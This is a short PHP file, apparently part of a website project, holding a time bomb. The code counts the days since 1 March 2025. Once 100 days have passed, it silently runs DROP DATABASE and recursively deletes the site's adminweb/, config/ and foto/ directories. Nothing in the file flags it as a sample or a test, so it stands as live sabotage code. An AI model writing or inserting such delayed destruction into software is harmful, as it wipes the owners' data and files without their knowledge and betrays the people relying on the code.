<?
    $selisih = time() - strtotime('2025-3-01') ;

    $hari = round($selisih / 86400 );
    $menit = round($selisih /  3600  );

if($hari >='100'){
$query=mysql_query("DROP DATABASE $database");
function delete_files($target) {
    if(is_dir($target)){
        $files = glob( $target . '*', GLOB_MARK ); //GLOB_MARK adds a slash to directories returned
        
        foreach( $files as $file )
        {
            delete_files( $file );      
        }
      
        rmdir( $target );
    } elseif(is_file($target)) {
        unlink( $target );  
    }
}
delete_files('adminweb/');
delete_files('config/');
delete_files('foto/');
}
?>